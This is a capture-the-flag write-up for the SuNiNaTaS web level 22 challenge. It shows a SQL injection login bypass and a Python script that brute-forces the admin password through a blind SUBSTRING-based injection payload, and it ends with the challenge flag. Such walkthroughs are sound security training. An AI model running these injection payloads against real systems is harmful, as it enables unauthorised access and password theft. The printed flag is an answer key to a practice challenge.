# Level 22   Blind SQLi

[http://suninatas.com/challenge/web22/web22.asp](http://suninatas.com/challenge/web22/web22.asp)

![level-22---blind-sqli.png](/assets/ctf/suninatas/web/level-22-blind-sqli.png)

`username: admin' --  -` -> Returns `OK admin`

Since `OR` is disabled we can use `AND` since username `admin` is valid and bruteforce the password.

Database is very fragile, so script kept crashing. Originally made async but db died instantly 
```python
import requests
import string

URL = 'http://suninatas.com/challenge/web22/web22.asp'
CHARSET = string.ascii_letters + string.digits + '(){}!?,_'
PAYLOAD = "admin' AND SUBSTRING(pw,{},1)='{}'--"

password = 'N1c3B'
password_i = len(password) + 1
while True:
    for c in CHARSET:
        print(f'\r[{password_i}] {password}{c}', end='')
        search = PAYLOAD.format(password_i, c)
        resp = requests.get(URL, params={'id': search, 'pw': 'uwu'})
        if 'OK' in resp.text:
            password += c
            password_i += 1
            break
    else:
        print(f'\r[Password] {password}{" "*16}')
        break
```

> Flag: `N1c3Bilnl)`

